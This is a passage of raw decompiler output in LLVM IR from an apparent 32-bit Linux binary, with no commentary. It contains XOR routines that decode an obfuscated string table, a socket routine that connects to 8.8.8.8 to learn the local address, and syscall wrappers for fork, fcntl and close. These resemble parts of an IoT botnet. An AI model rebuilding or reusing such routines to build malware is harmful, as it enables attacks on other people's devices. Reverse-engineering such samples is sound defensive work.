  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804f6e8 = udiv i32 %v1_804f6d4, 16777216
  %v2_804f6eb = udiv i32 %v1_804f6d4, 256
  store i32 %v2_804f6eb, i32* %edi.global-to-local, align 4
  %v5_804f6ee = trunc i32 %v2_804f6e8 to i8
  store i8 %v5_804f6ee, i8* %stack_var_-44, align 1
  %v2_804f6f1 = udiv i32 %v1_804f6d4, 65536
  store i32 %v2_804f6f1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f6f4

dec_label_pc_804f6f4:                             ; preds = %dec_label_pc_804f6f4.dec_label_pc_804f6f4_crit_edge, %dec_label_pc_804f6e0
  %v0_804f6fa = phi i32 [ %v0_804f6fa.pre, %dec_label_pc_804f6f4.dec_label_pc_804f6f4_crit_edge ], [ %v1_804f6d4, %dec_label_pc_804f6e0 ]
  %v0_804f6f6 = phi i32 [ %v1_804f726, %dec_label_pc_804f6f4.dec_label_pc_804f6f4_crit_edge ], [ 0, %dec_label_pc_804f6e0 ]
  %v0_804f6f4 = phi i32 [ %v0_804f71e, %dec_label_pc_804f6f4.dec_label_pc_804f6f4_crit_edge ], [ %v2_804f6cd, %dec_label_pc_804f6e0 ]
  %v1_804f6f4 = inttoptr i32 %v0_804f6f4 to i32*
  %v2_804f6f4 = load i32, i32* %v1_804f6f4, align 4
  %v2_804f6f8 = add i32 %v2_804f6f4, %v0_804f6f6
  %v1_804f6fc = inttoptr i32 %v2_804f6f8 to i8*
  %v2_804f6fc = load i8, i8* %v1_804f6fc, align 1
  %v4_804f6fc = trunc i32 %v0_804f6fa to i8
  %v5_804f6fc = xor i8 %v2_804f6fc, %v4_804f6fc
  store i8 %v5_804f6fc, i8* %v1_804f6fc, align 1
  %v0_804f6fe = load i32, i32* %edx.global-to-local, align 4
  %v0_804f700 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f700 = inttoptr i32 %v0_804f700 to i32*
  %v2_804f700 = load i32, i32* %v1_804f700, align 4
  %v2_804f702 = add i32 %v2_804f700, %v0_804f6fe
  %v0_804f704 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f706 = inttoptr i32 %v2_804f702 to i8*
  %v2_804f706 = load i8, i8* %v1_804f706, align 1
  %v4_804f706 = trunc i32 %v0_804f704 to i8
  %v5_804f706 = xor i8 %v2_804f706, %v4_804f706
  store i8 %v5_804f706, i8* %v1_804f706, align 1
  %v0_804f708 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f70a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f70a = inttoptr i32 %v0_804f70a to i32*
  %v2_804f70a = load i32, i32* %v1_804f70a, align 4
  %v2_804f70c = add i32 %v2_804f70a, %v0_804f708
  %v0_804f70e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f710 = inttoptr i32 %v2_804f70c to i8*
  %v2_804f710 = load i8, i8* %v1_804f710, align 1
  %v4_804f710 = trunc i32 %v0_804f70e to i8
  %v5_804f710 = xor i8 %v2_804f710, %v4_804f710
  store i8 %v5_804f710, i8* %v1_804f710, align 1
  %v0_804f712 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f714 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f714 = inttoptr i32 %v0_804f714 to i32*
  %v2_804f714 = load i32, i32* %v1_804f714, align 4
  %v1_804f716 = add i32 %v0_804f712, 1
  store i32 %v1_804f716, i32* %edx.global-to-local, align 4
  %v2_804f717 = add i32 %v2_804f714, %v0_804f712
  %v2_804f719 = load i8, i8* %stack_var_-44, align 1
  %v1_804f71c = inttoptr i32 %v2_804f717 to i8*
  %v2_804f71c = load i8, i8* %v1_804f71c, align 1
  %v5_804f71c = xor i8 %v2_804f71c, %v2_804f719
  store i8 %v5_804f71c, i8* %v1_804f71c, align 1
  %v0_804f71e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f71e = add i32 %v0_804f71e, 4
  %v2_804f71e = inttoptr i32 %v1_804f71e to i32*
  %v3_804f71e = load i32, i32* %v2_804f71e, align 4
  %v1_804f721 = urem i32 %v3_804f71e, 65536
  %v1_804f726 = load i32, i32* %edx.global-to-local, align 4
  %v8_804f728 = icmp sgt i32 %v1_804f721, %v1_804f726
  br i1 %v8_804f728, label %dec_label_pc_804f6f4.dec_label_pc_804f6f4_crit_edge, label %dec_label_pc_804f72a

dec_label_pc_804f6f4.dec_label_pc_804f6f4_crit_edge: ; preds = %dec_label_pc_804f6f4
  %v0_804f6fa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f6f4

dec_label_pc_804f72a:                             ; preds = %dec_label_pc_804f6f4, %dec_label_pc_804f6c0
  %v0_804f731 = phi i32 [ %v1_804f6d4, %dec_label_pc_804f6c0 ], [ %v1_804f721, %dec_label_pc_804f6f4 ]
  ret i32 %v0_804f731

; uselistorder directives
  uselistorder i32 %v1_804f726, { 1, 0 }
  uselistorder i32 %v1_804f721, { 1, 0 }
  uselistorder i32 %v0_804f71e, { 1, 0 }
  uselistorder i32 %v1_804f6d4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_804f740() local_unnamed_addr {
dec_label_pc_804f740:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f749 = zext i8 %tmp to i32
  %v1_804f74d = mul nuw nsw i32 %v4_804f749, 8
  %v2_804f74d = add i32 %v1_804f74d, ptrtoint (i32* @global_var_8054440.28 to i32)
  store i32 %v2_804f74d, i32* %ecx.global-to-local, align 4
  %v0_804f754 = load i16, i16* @global_var_80542dc.29, align 2
  %v1_804f754 = sext i16 %v0_804f754 to i32
  %v1_804f759 = add i32 %v1_804f74d, add (i32 ptrtoint (i32* @global_var_8054440.28 to i32), i32 4)
  %v2_804f759 = inttoptr i32 %v1_804f759 to i16*
  %v3_804f759 = load i16, i16* %v2_804f759, align 4
  %v4_804f759 = icmp eq i16 %v3_804f759, 0
  br i1 %v4_804f759, label %dec_label_pc_804f7aa, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f740
  store i32 %v1_804f754, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804f768 = udiv i32 %v1_804f754, 16777216
  %v2_804f76b = udiv i32 %v1_804f754, 256
  store i32 %v2_804f76b, i32* %edi.global-to-local, align 4
  %v5_804f76e = trunc i32 %v2_804f768 to i8
  store i8 %v5_804f76e, i8* %stack_var_-44, align 1
  %v2_804f771 = udiv i32 %v1_804f754, 65536
  store i32 %v2_804f771, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f774

dec_label_pc_804f774:                             ; preds = %dec_label_pc_804f774.dec_label_pc_804f774_crit_edge, %dec_label_pc_804f760
  %v0_804f77a = phi i32 [ %v0_804f77a.pre, %dec_label_pc_804f774.dec_label_pc_804f774_crit_edge ], [ %v1_804f754, %dec_label_pc_804f760 ]
  %v0_804f776 = phi i32 [ %v1_804f7a6, %dec_label_pc_804f774.dec_label_pc_804f774_crit_edge ], [ 0, %dec_label_pc_804f760 ]
  %v0_804f774 = phi i32 [ %v0_804f79e, %dec_label_pc_804f774.dec_label_pc_804f774_crit_edge ], [ %v2_804f74d, %dec_label_pc_804f760 ]
  %v1_804f774 = inttoptr i32 %v0_804f774 to i32*
  %v2_804f774 = load i32, i32* %v1_804f774, align 4
  %v2_804f778 = add i32 %v2_804f774, %v0_804f776
  %v1_804f77c = inttoptr i32 %v2_804f778 to i8*
  %v2_804f77c = load i8, i8* %v1_804f77c, align 1
  %v4_804f77c = trunc i32 %v0_804f77a to i8
  %v5_804f77c = xor i8 %v2_804f77c, %v4_804f77c
  store i8 %v5_804f77c, i8* %v1_804f77c, align 1
  %v0_804f77e = load i32, i32* %edx.global-to-local, align 4
  %v0_804f780 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f780 = inttoptr i32 %v0_804f780 to i32*
  %v2_804f780 = load i32, i32* %v1_804f780, align 4
  %v2_804f782 = add i32 %v2_804f780, %v0_804f77e
  %v0_804f784 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f786 = inttoptr i32 %v2_804f782 to i8*
  %v2_804f786 = load i8, i8* %v1_804f786, align 1
  %v4_804f786 = trunc i32 %v0_804f784 to i8
  %v5_804f786 = xor i8 %v2_804f786, %v4_804f786
  store i8 %v5_804f786, i8* %v1_804f786, align 1
  %v0_804f788 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f78a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f78a = inttoptr i32 %v0_804f78a to i32*
  %v2_804f78a = load i32, i32* %v1_804f78a, align 4
  %v2_804f78c = add i32 %v2_804f78a, %v0_804f788
  %v0_804f78e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f790 = inttoptr i32 %v2_804f78c to i8*
  %v2_804f790 = load i8, i8* %v1_804f790, align 1
  %v4_804f790 = trunc i32 %v0_804f78e to i8
  %v5_804f790 = xor i8 %v2_804f790, %v4_804f790
  store i8 %v5_804f790, i8* %v1_804f790, align 1
  %v0_804f792 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f794 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f794 = inttoptr i32 %v0_804f794 to i32*
  %v2_804f794 = load i32, i32* %v1_804f794, align 4
  %v1_804f796 = add i32 %v0_804f792, 1
  store i32 %v1_804f796, i32* %edx.global-to-local, align 4
  %v2_804f797 = add i32 %v2_804f794, %v0_804f792
  %v2_804f799 = load i8, i8* %stack_var_-44, align 1
  %v1_804f79c = inttoptr i32 %v2_804f797 to i8*
  %v2_804f79c = load i8, i8* %v1_804f79c, align 1
  %v5_804f79c = xor i8 %v2_804f79c, %v2_804f799
  store i8 %v5_804f79c, i8* %v1_804f79c, align 1
  %v0_804f79e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f79e = add i32 %v0_804f79e, 4
  %v2_804f79e = inttoptr i32 %v1_804f79e to i32*
  %v3_804f79e = load i32, i32* %v2_804f79e, align 4
  %v1_804f7a1 = urem i32 %v3_804f79e, 65536
  %v1_804f7a6 = load i32, i32* %edx.global-to-local, align 4
  %v8_804f7a8 = icmp sgt i32 %v1_804f7a1, %v1_804f7a6
  br i1 %v8_804f7a8, label %dec_label_pc_804f774.dec_label_pc_804f774_crit_edge, label %dec_label_pc_804f7aa

dec_label_pc_804f774.dec_label_pc_804f774_crit_edge: ; preds = %dec_label_pc_804f774
  %v0_804f77a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f774

dec_label_pc_804f7aa:                             ; preds = %dec_label_pc_804f774, %dec_label_pc_804f740
  %v0_804f7b1 = phi i32 [ %v1_804f754, %dec_label_pc_804f740 ], [ %v1_804f7a1, %dec_label_pc_804f774 ]
  ret i32 %v0_804f7b1

; uselistorder directives
  uselistorder i32 %v1_804f7a6, { 1, 0 }
  uselistorder i32 %v1_804f7a1, { 1, 0 }
  uselistorder i32 %v0_804f79e, { 1, 0 }
  uselistorder i32 %v1_804f754, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8054440.28 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_80542dc.29, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8054440.28 to i32), { 1, 2, 3, 0 }
}

define i32 @function_804fd10(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fd10:
  %v4_804fd10 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fd10, i32* @edx, align 4
  %v2_804fd16 = load i8, i8* %arg1, align 1
  %v3_804fd16 = icmp eq i8 %v2_804fd16, 0
  br i1 %v3_804fd16, label %dec_label_pc_804fd27, label %dec_label_pc_804fd20

dec_label_pc_804fd20:                             ; preds = %dec_label_pc_804fd10, %dec_label_pc_804fd20
  %v0_804fd20 = phi i32 [ %v1_804fd20, %dec_label_pc_804fd20 ], [ 0, %dec_label_pc_804fd10 ]
  %v1_804fd20 = add i32 %v0_804fd20, 1
  %v2_804fd21 = add i32 %v1_804fd20, %v4_804fd10
  %v3_804fd21 = inttoptr i32 %v2_804fd21 to i8*
  %v4_804fd21 = load i8, i8* %v3_804fd21, align 1
  %v5_804fd21 = icmp eq i8 %v4_804fd21, 0
  %v1_804fd25 = icmp eq i1 %v5_804fd21, false
  br i1 %v1_804fd25, label %dec_label_pc_804fd20, label %dec_label_pc_804fd27

dec_label_pc_804fd27:                             ; preds = %dec_label_pc_804fd20, %dec_label_pc_804fd10
  %v0_804fd27 = phi i32 [ 0, %dec_label_pc_804fd10 ], [ %v1_804fd20, %dec_label_pc_804fd20 ]
  ret i32 %v0_804fd27

; uselistorder directives
  uselistorder label %dec_label_pc_804fd20, { 1, 0 }
}

define i32 @function_804fda0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fda0:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804fda8 = icmp eq i32 %arg2, 0
  br i1 %v1_804fda8, label %dec_label_pc_804fda0.dec_label_pc_804fdb9_crit_edge, label %dec_label_pc_804fdac

dec_label_pc_804fda0.dec_label_pc_804fdb9_crit_edge: ; preds = %dec_label_pc_804fda0
  %v0_804fdb9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804fdb9

dec_label_pc_804fdac:                             ; preds = %dec_label_pc_804fda0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804fdb05 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_804fdb05, align 1
  %v0_804fdb46 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdb47 = add i32 %v0_804fdb46, 1
  store i32 %v1_804fdb47, i32* %eax.global-to-local, align 4
  %v12_804fdb58 = icmp eq i32 %v1_804fdb47, %arg2
  %v1_804fdb79 = icmp eq i1 %v12_804fdb58, false
  br i1 %v1_804fdb79, label %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge, label %dec_label_pc_804fdb9

dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge: ; preds = %dec_label_pc_804fdac, %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge
  %v1_804fdb410 = phi i32 [ %v1_804fdb4, %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge ], [ %v1_804fdb47, %dec_label_pc_804fdac ]
  %v1_804fdb0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fdb0 = add i32 %v1_804fdb410, %v1_804fdb0.pre
  %v3_804fdb0 = inttoptr i32 %v2_804fdb0 to i8*
  store i8 0, i8* %v3_804fdb0, align 1
  %v0_804fdb4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdb4 = add i32 %v0_804fdb4, 1
  store i32 %v1_804fdb4, i32* %eax.global-to-local, align 4
  %v12_804fdb5 = icmp eq i32 %v1_804fdb4, %arg2
  %v1_804fdb7 = icmp eq i1 %v12_804fdb5, false
  br i1 %v1_804fdb7, label %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge, label %dec_label_pc_804fdb9

dec_label_pc_804fdb9:                             ; preds = %dec_label_pc_804fdac, %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge, %dec_label_pc_804fda0.dec_label_pc_804fdb9_crit_edge
  %v0_804fdb9 = phi i32 [ %v0_804fdb9.pre, %dec_label_pc_804fda0.dec_label_pc_804fdb9_crit_edge ], [ %v1_804fdb47, %dec_label_pc_804fdac ], [ %v1_804fdb4, %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge ]
  ret i32 %v0_804fdb9

; uselistorder directives
  uselistorder i32 %v1_804fdb4, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdb9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdb0.dec_label_pc_804fdb0_crit_edge, { 1, 0 }
}

define i32 @function_804fdc0() local_unnamed_addr {
dec_label_pc_804fdc0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_804fdd5 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_804fdd5, %tmp17
  br i1 %or.cond, label %dec_label_pc_804fdda, label %dec_label_pc_804fde4

dec_label_pc_804fdda:                             ; preds = %dec_label_pc_804fdf2, %dec_label_pc_804fe05, %dec_label_pc_804fdc0
  %storemerge = phi i32 [ -1, %dec_label_pc_804fdc0 ], [ -1, %dec_label_pc_804fdf2 ], [ %v0_804fdf3, %dec_label_pc_804fe05 ]
  ret i32 %storemerge

dec_label_pc_804fde4:                             ; preds = %dec_label_pc_804fdc0
  %v2_804fdfc = add i32 %tmp, -1
  br label %dec_label_pc_804fdf8

dec_label_pc_804fdf0:                             ; preds = %dec_label_pc_804fdf8
  br label %dec_label_pc_804fdf2

dec_label_pc_804fdf2:                             ; preds = %dec_label_pc_804fe05, %dec_label_pc_804fdf0
  %v2_804fe003 = phi i32 [ %v1_804fe05, %dec_label_pc_804fe05 ], [ 0, %dec_label_pc_804fdf0 ]
  %v1_804fdf2 = add i32 %v0_804fdf2, 1
  %v1_804fdf3 = add i32 %v0_804fdf3, 1
  %v12_804fdf4 = icmp eq i32 %tmp10, %v1_804fdf2
  br i1 %v12_804fdf4, label %dec_label_pc_804fdda, label %dec_label_pc_804fdf8

dec_label_pc_804fdf8:                             ; preds = %dec_label_pc_804fdf2, %dec_label_pc_804fde4
  %v0_804fdf2 = phi i32 [ %v1_804fdf2, %dec_label_pc_804fdf2 ], [ 0, %dec_label_pc_804fde4 ]
  %v0_804fe05 = phi i32 [ %v2_804fe003, %dec_label_pc_804fdf2 ], [ 0, %dec_label_pc_804fde4 ]
  %v0_804fdf3 = phi i32 [ %v1_804fdf3, %dec_label_pc_804fdf2 ], [ 1, %dec_label_pc_804fde4 ]
  %v3_804fdfc = add i32 %v2_804fdfc, %v0_804fdf3
  %v4_804fdfc = inttoptr i32 %v3_804fdfc to i8*
  %v5_804fdfc = load i8, i8* %v4_804fdfc, align 1
  %v4_804fe00 = add i32 %v0_804fe05, %tmp8
  %v5_804fe00 = inttoptr i32 %v4_804fe00 to i8*
  %v6_804fe00 = load i8, i8* %v5_804fe00, align 1
  %v17_804fe00 = icmp eq i8 %v5_804fdfc, %v6_804fe00
  %v1_804fe03 = icmp eq i1 %v17_804fe00, false
  br i1 %v1_804fe03, label %dec_label_pc_804fdf0, label %dec_label_pc_804fe05

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fdf8
  %v1_804fe05 = add i32 %v0_804fe05, 1
  %v12_804fe06 = icmp eq i32 %tmp9, %v1_804fe05
  %v1_804fe08 = icmp eq i1 %v12_804fe06, false
  br i1 %v1_804fe08, label %dec_label_pc_804fdf2, label %dec_label_pc_804fdda

; uselistorder directives
  uselistorder i32 %v0_804fdf3, { 2, 0, 1 }
  uselistorder i32 %v0_804fe05, { 1, 0 }
  uselistorder i32 %v1_804fdf2, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdda, { 1, 0, 2 }
}

define i32 @function_804ff80() local_unnamed_addr {
dec_label_pc_804ff80:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_804ff8d = call i32 @function_805076b(i32 16)
  %v1_804ff92 = inttoptr i32 %v1_804ff8d to i32*
  store i32 0, i32* %v1_804ff92, align 4
  %v4_804ff9f = call i32 @function_8050a17(i32 2, i32 2, i32 0, i32 %v1_804ff8d)
  store i32 %v4_804ff9f, i32* %esi.global-to-local, align 4
  %v10_804ffab = icmp eq i32 %v4_804ff9f, -1
  br i1 %v10_804ffab, label %dec_label_pc_804fff2, label %dec_label_pc_804ffb0

dec_label_pc_804ffb0:                             ; preds = %dec_label_pc_804ff80
  %v2_804ffb0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ffb0, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804ffcf = call i32 @function_805083c(i32 %v4_804ff9f, i32 %v2_804ffb0, i32 16)
  %v2_804ffd7 = ptrtoint i32* %stack_var_-12 to i32
  %v0_804ffdd = load i32, i32* %esi.global-to-local, align 4
  %v3_804ffde = call i32 @function_8050867(i32 %v0_804ffdd, i32 %v2_804ffb0, i32 %v2_804ffd7)
  %v1_804ffe6 = call i32 @function_8050233(i32 %v0_804ffdd)
  br label %dec_label_pc_804fff2

dec_label_pc_804fff2:                             ; preds = %dec_label_pc_804ff80, %dec_label_pc_804ffb0
  %v0_804fff7 = phi i32 [ 0, %dec_label_pc_804ff80 ], [ 134744072, %dec_label_pc_804ffb0 ]
  ret i32 %v0_804fff7

; uselistorder directives
  uselistorder i32 %v4_804ff9f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805083c, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050a17, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804fff2, { 1, 0 }
}

define i32 @function_805019d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805019d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805019d = load i32, i32* @edi, align 4
  %v0_805019e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80501b2 = add i32 %arg2, -12
  %v6_80501bc = icmp ugt i32 %v1_80501b2, 2
  br i1 %v6_80501bc, label %dec_label_pc_80501cc, label %dec_label_pc_80501be

dec_label_pc_80501be:                             ; preds = %dec_label_pc_805019d
  %v4_80501c2 = call i32 @function_80501f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80501b2)
  br label %dec_label_pc_80501ee

dec_label_pc_80501cc:                             ; preds = %dec_label_pc_805019d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80501d4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_80501d4, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_80501d4, -4095
  br i1 %tmp17, label %dec_label_pc_80501ec, label %dec_label_pc_80501e0

dec_label_pc_80501e0:                             ; preds = %dec_label_pc_80501cc
  %v1_80501e0 = call i32 @function_805076b(i32 %v0_805019e)
  %v0_80501e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501e5 = sub i32 0, %v0_80501e5
  %v2_80501e7 = inttoptr i32 %v1_80501e0 to i32*
  store i32 %v1_80501e5, i32* %v2_80501e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501ec

dec_label_pc_80501ec:                             ; preds = %dec_label_pc_80501cc, %dec_label_pc_80501e0
  %v0_80501ec = phi i32 [ %v2_80501d4, %dec_label_pc_80501cc ], [ -1, %dec_label_pc_80501e0 ]
  br label %dec_label_pc_80501ee

dec_label_pc_80501ee:                             ; preds = %dec_label_pc_80501be, %dec_label_pc_80501ec
  %v0_80501f3 = phi i32 [ %v4_80501c2, %dec_label_pc_80501be ], [ %v0_80501ec, %dec_label_pc_80501ec ]
  store i32 %v0_805019e, i32* @ebx, align 4
  store i32 %v0_805019d, i32* @edi, align 4
  ret i32 %v0_80501f3

; uselistorder directives
  uselistorder i32 %v2_80501d4, { 1, 0, 2 }
  uselistorder i32 %v0_805019e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80501ee, { 1, 0 }
  uselistorder label %dec_label_pc_80501ec, { 1, 0 }
}

define i32 @function_80501f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80501f4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80501f4 = load i32, i32* @edi, align 4
  store i32 %v0_80501f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805020c = load i32, i32* @ebx, align 4
  %v1_8050214 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8050214, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8050214, -4095
  br i1 %tmp12, label %dec_label_pc_805022c, label %dec_label_pc_8050220

dec_label_pc_8050220:                             ; preds = %dec_label_pc_80501f4
  %v1_8050220 = call i32 @function_805076b(i32 %v0_805020c)
  %v0_8050225 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050225 = sub i32 0, %v0_8050225
  %v2_8050227 = inttoptr i32 %v1_8050220 to i32*
  store i32 %v1_8050225, i32* %v2_8050227, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050231.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805022c

dec_label_pc_805022c:                             ; preds = %dec_label_pc_80501f4, %dec_label_pc_8050220
  %v2_8050231 = phi i32 [ %v0_80501f4, %dec_label_pc_80501f4 ], [ %v2_8050231.pre, %dec_label_pc_8050220 ]
  %v0_805022c = phi i32 [ %v1_8050214, %dec_label_pc_80501f4 ], [ -1, %dec_label_pc_8050220 ]
  store i32 %v2_8050231, i32* %edi.global-to-local, align 4
  ret i32 %v0_805022c

; uselistorder directives
  uselistorder i32 %v1_8050214, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805022c, { 1, 0 }
}

define i32 @function_8050233(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050233:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050233 = load i32, i32* @edi, align 4
  store i32 %v0_8050233, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805023b = load i32, i32* @ebx, align 4
  %v1_8050243 = call i32 @close(i32 %arg1)
  store i32 %v0_805023b, i32* @ebx, align 4
  store i32 %v1_8050243, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8050243, -4095
  br i1 %tmp9, label %dec_label_pc_805025b, label %dec_label_pc_805024f

dec_label_pc_805024f:                             ; preds = %dec_label_pc_8050233
  %v1_805024f = call i32 @function_805076b(i32 %v0_805023b)
  %v0_8050254 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050254 = sub i32 0, %v0_8050254
  %v2_8050256 = inttoptr i32 %v1_805024f to i32*
  store i32 %v1_8050254, i32* %v2_8050256, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805025f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805025b

dec_label_pc_805025b:                             ; preds = %dec_label_pc_8050233, %dec_label_pc_805024f
  %v2_805025f = phi i32 [ %v0_8050233, %dec_label_pc_8050233 ], [ %v2_805025f.pre, %dec_label_pc_805024f ]
  %v0_805025b = phi i32 [ %v1_8050243, %dec_label_pc_8050233 ], [ -1, %dec_label_pc_805024f ]
  store i32 %v2_805025f, i32* @edi, align 4
  ret i32 %v0_805025b

; uselistorder directives
  uselistorder i32 %v1_8050243, { 1, 0, 2 }
  uselistorder i32 %v0_805023b, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805025b, { 1, 0 }
}

define i32 @function_8050261() local_unnamed_addr {
dec_label_pc_8050261:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050261 = load i32, i32* @ebx, align 4
  store i32 %v0_8050261, i32* %stack_var_-4, align 4
  %v1_805026a = call i32 @fork(i32 %v0_8050261)
  store i32 %v1_805026a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805026a, -4095
  br i1 %tmp7, label %dec_label_pc_8050281, label %dec_label_pc_8050275

dec_label_pc_8050275:                             ; preds = %dec_label_pc_8050261
  %v1_8050275 = call i32 @function_805076b(i32 %v0_8050261)
  %v0_805027a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805027a = sub i32 0, %v0_805027a
  %v2_805027c = inttoptr i32 %v1_8050275 to i32*
  store i32 %v1_805027a, i32* %v2_805027c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050285.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050281

dec_label_pc_8050281:                             ; preds = %dec_label_pc_8050261, %dec_label_pc_8050275
  %v2_8050285 = phi i32 [ %v0_8050261, %dec_label_pc_8050261 ], [ %v2_8050285.pre, %dec_label_pc_8050275 ]
  %v0_8050281 = phi i32 [ %v1_805026a, %dec_label_pc_8050261 ], [ -1, %dec_label_pc_8050275 ]
  store i32 %v2_8050285, i32* @ebx, align 4
  ret i32 %v0_8050281

; uselistorder directives
  uselistorder i32 %v1_805026a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050281, { 1, 0 }
}

define i32 @function_8050287() local_unnamed_addr {
dec_label_pc_8050287:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
